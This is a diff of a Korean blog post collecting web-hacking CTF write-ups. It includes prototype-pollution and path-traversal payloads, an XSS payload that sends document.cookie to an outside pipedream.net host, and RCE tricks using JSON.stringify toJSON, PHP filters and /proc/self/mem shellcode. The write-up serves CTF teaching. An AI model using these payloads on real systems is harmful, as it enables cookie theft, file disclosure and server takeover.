@@ -27,7 +27,7 @@ pin: false
 안녕하세요, Space War 2024#1 Web hacking CTF 파트의 write-up을 맡게 된 안건희(ipwn)입니다.
 사실 제가 주로 공부하는 분야는 웹해킹이 아니라는 옥에 티(..)가 있지만, 출제자의 write-up을 공유하려는 목적으로 작성된 블로그 포스트이니만큼 아무래도 괜찮을 것 같습니다.
 
-이번 포스트에서는 목차에 적혀있는 것처럼 Space War가 무엇인지! 어떤 대회인지! ...에 대해 간단히 이야기 드리고 이후에 출제자 분들의 write-up을 공유드리면서 마무리 하겠습니다.
+이번 포스트에서는 목차에 적혀있는 것처럼 Space War가 무엇인지! 어떤 대회인지 간단히 이야기 드리고 이후에 출제자 분들의 write-up을 공유드리면서 마무리 하겠습니다.
 <br><br>
 
 ---
@@ -340,9 +340,7 @@ uid가 0이여야 하는데 일반적으론 uid를 0으로 설정하는 것이 �
 위를 우회했기 때문에 vm안에서 코드를 실행하는 것이 가능한데 filter로 인해서 flag 파일을 읽는 것이 불가능하다.
 이는 Prototype pollution을 이용하면 우회하여 flag 파일을 읽는 것이 가능하다.
 
-```
-a={};a.__proto__.protocol='file:';a.__proto__.pathname='/flag.txt';a.__proto__.href='a';a.__proto__.origin='a';a.__proto__.hostname='';readFile([])
-```
+`a={};a.__proto__.protocol='file:';a.__proto__.pathname='/flag.txt';a.__proto__.href='a';a.__proto__.origin='a';a.__proto__.hostname='';readFile([])`
 
 prototpe pollution을 이용해서 fs.readFileSync가 전혀 다른 파일을 읽도록 하는 것이 가능하다.
 
@@ -354,9 +352,7 @@ prototpe pollution을 이용해서 fs.readFileSync가 전혀 다른 파일을 �
 
 ->
 
-```
-uid=0.3e1; passwd=8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92; data=1+1])%3ba={}%3ba.__proto__.protocol='file:'%3ba.__proto__.pathname='/flag.txt'%3ba.__proto__.href='asdf'%3ba.__proto__.origin='a'%3ba.__proto__.hostname=''%3breadFile([])//
-```
+`uid=0.3e1; passwd=8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92; data=1+1])%3ba={}%3ba.__proto__.protocol='file:'%3ba.__proto__.pathname='/flag.txt'%3ba.__proto__.href='asdf'%3ba.__proto__.origin='a'%3ba.__proto__.hostname=''%3breadFile([])//`
 
 여기서 uid 0.3e1에서 3은 자신이 부여받은 uid를 넣어주면 된다.
 
@@ -394,18 +390,18 @@ def index():
 
 매우 간단한 구성을 가진 코드다. xss를 해야하는데 csp가 걸려있다.
 
-```default-src 'self'; base-uri 'none'; script-src 'nonce-~~'
-    'unsafe-inline'; require-trusted-types-for 'script'; trusted-types default"
+```
+default-src 'self'; base-uri 'none'; script-src 'nonce-~~'
+'unsafe-inline'; require-trusted-types-for 'script'; trusted-types default"
 ```
 
-굉장히 튼튼해보이며, template이 들어가는 곳엔
+굉장히 튼튼해보이며, template이 들어가는 곳엔 sanitize 없이 우리의 Input이 출력된다.
 
 ```
 {{ note | safe }}
 ```
 
-sanitize 없이 우리의 Input이 출력된다.
-Injection이 가능한 point는 2곳이 있는데
+Injection이 가능한 point는 2곳이 존재한다.
 
 ```html
 <script nonce="{{ nonce }}">
@@ -421,14 +417,13 @@ Injection이 가능한 point는 2곳이 있는데
 </script>
 ```
 
-첫 번째는 맨 먼저 나오는 스크립트 태그,
-두 번째는 마지막 스크립트 태그에 있다.
+첫 번째는 맨 먼저 나오는 스크립트 태그, 두 번째는 마지막 스크립트 태그에 있다.
 이때 name, code 파라미터엔 `(,),{,}`가 필터링되었기 때문에 quote를 탈출해도 임의의 함수 실행이 불가능하다.
 2번째 인젝션 포인트에선 `(,),{,}`를 사용할 수 있지만 json 형태로 변형되며 backslash가 붙기 때문에 quote를 탈출할 수 없다.
 이를 익스플로잇하기 위해선 nonce bypass를 위해 script 태그의 탈출 없이 이미 정의된 script tag 내에서 함수를 실행해야한다.
 여기서 대충 html 스펙을 이용한 트릭을 사용해주면 된다.
 
-```
+```js
 <!--<script//*
 ```
 
@@ -439,9 +434,7 @@ https://html.spec.whatwg.org/multipage/parsing.html#script-data-double-escape-st
 
 아무튼 저걸 쓰면 2개의 html을 기가막히게 합칠 수 있다. 그럼 아래 부분에서 마저 인젝션을 해주면 xss를 얻을 수 있다.
 
-```
-http://server:8188/report?url=http://web:8080/?title=adsf%26name=<!--<script//*%26content=<img src=%27*/};location.replace(`https://enllwt2ugqrt.x.pipedream.net/${document.cookie}`);console.log({//</script><!--
-```
+`http://server:8188/report?url=http://web:8080/?title=adsf%26name=<!--<script//*%26content=<img src=%27*/};location.replace(`https://enllwt2ugqrt.x.pipedream.net/${document.cookie}`);console.log({//</script><!--`
 
 ### 블로그 포스트 작성자의 추가적인 코멘트
 
@@ -490,9 +483,7 @@ page 파라미터로 값을 전달받은 뒤 fs.readFileSync 함수로 해당 �
 여기서 path traversal이 되는데 flag파일에 권한이 없기 때문에 쉘을 따야한다.
 하지만 node를 실행하는 부분의 인자를 확인해보면 다음과 같은 내용을 확인할 수 있다.
 
-```
-node --experimental-permission --allow-fs-read=/* --allow-fs-write=/* /app/app.js
-```
+`node --experimental-permission --allow-fs-read=/* --allow-fs-write=/* /app/app.js`
 
 실험 기능을 통해서 파일 read와 write만 허용해놔서 child_process 같은 모듈을 이용한 rce가 불가능하다.
 
@@ -501,19 +492,16 @@ node --experimental-permission --allow-fs-read=/* --allow-fs-write=/* /app/app.j
 nginx에서 특정 크기 이상의 body data는 임시 파일 형태로 잠시 저장하는 것을 이용, /proc/pid/fd에 접근하여 해당 파일을 include하는 것으로 임의의 템플릿을 로드할 수 있다.
 쉘은 쉘코드를 이용하여 획득하면 되는데 임의의 파일 쓰기, 읽기가 되기 때문에 /proc/self/mem을 열어서 맞는 offset에 쉘코드를 작성하면 쉘을 획득할 수 있다.
 
-exploit 폴더에 있는 ex.py를 실행하면 exploit.js를 서버에 업로드해주는데
-이때
+exploit 폴더에 있는 ex.py를 실행하면 exploit.js를 서버에 업로드해준다.
 
-```
-http://server/?page=../../../../proc/{nginx_pid}/fd/{random_fd}
-```
+`http://server/?page=../../../../proc/{nginx_pid}/fd/{random_fd}`
 
-로 접근해보면 특정 fd 값에서 업로드되고 있는 exploit.js의 내용이 Include되는 것을 확인할 수 있다.
+이 때 위 URL로 접근해보면 특정 fd 값에서 업로드되고 있는 exploit.js의 내용이 Include되는 것을 확인할 수 있다.
 그럼 이제 쉘코드를 수정해서 내 서버로 리버스쉘을 연결하도록 하고 다시 공격을 진행하면 특정 offset에서 쉘을 획득할 수 있다(서버 환경마다 좀 바뀌므로 여러 번의 시도가 필요하다)
 
 ### 블로그 포스트 작성자의 추가적인 코멘트
 
-출제자분이 너무 상세하게 풀이를 잘 써주셔서 따로 코멘트 할만한 점은 없는 것 같습니다..만! 위 문제는 사실 `Well-known` 취약점 및 익스플로잇입니다. 문제의 내용을 토대로 떠올릴 수 있는 키워드인 `node temp file RCE` 등의 키워드로 구글에 검색해보면 [이런 블로그](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-temp-file-uploads)같은 유용한 검색 결과들을 확인할 수 있습니다. <br>
+출제자분이 너무 상세하게 풀이를 잘 써주셔서 따로 코멘트 할만한 점은 없는 것 같습니다..만! 위 문제는 사실 `Well-known` 취약점 및 익스플로잇입니다. 문제의 내용을 토대로 떠올릴 수 있는 키워드인 `node temp file RCE` 등의 키워드로 구글에 검색해보면 [lfi2rce-via-temp-file-uploads 포스팅 블로그](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-temp-file-uploads)같은 유용한 검색 결과들을 확인할 수 있습니다. <br>
 `Well-known` 취약점들이 CTF에 출제되는 경우는 잦습니다. 떄문에 이러한 문제들을 해결할 때에는 문제와 관련된 정보들을 구글링 해보며 관련 취약점은 어떤 것들이 있는지, 해당 취약점을 어떻게 적용시킬 수 있을지 잘 파악하는 것이 중요하겠습니다. 그리고 앞서 말했던 것처럼 단순히 문제를 푸는 것에서 끝나는 게 아니라 **취약점이 발생하는 이유를 이해하는 것**이 가장 중요합니다.
 
 ---
@@ -563,8 +551,7 @@ express.js의 res.json 함수 내에서 사용하는 stringify 함수의 일부�
 JSON.stringify({"toJSON":Function(`console.log("pwned");`)});
 ```
 
-이 코드를 실행하면 우린
-pwned가 출력되는 것을 확인할 수 있다. 이 기능을 이용하면 따로 실행해주는 로직이 없더라도 단순히 stringify 함수를 통해서 쉘을 획득할 수 있게된다.
+이 코드를 실행하면 우린 pwned가 출력되는 것을 확인할 수 있다. 이 기능을 이용하면 따로 실행해주는 로직이 없더라도 단순히 stringify 함수를 통해서 쉘을 획득할 수 있게된다.
 
 아무튼 이를 이용하여 쉘을 획득해주면 된다.
 
@@ -583,16 +570,13 @@ php filter를 이용한 rce다.
 
 https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d
 
-이걸 이용하되,
+이걸 이용하되, 이 필터를 우회해야한다.
 
 ```php
 if($page[0] === '/' || preg_match("/^.*(\\.\\.|php).*$/i", $page)) {
     die("no hack");
 }
 ```
-
-이 필터를 우회해야한다.
-이는
 
 ```php
 ini_set('pcre.backtrack_limit', 1000);
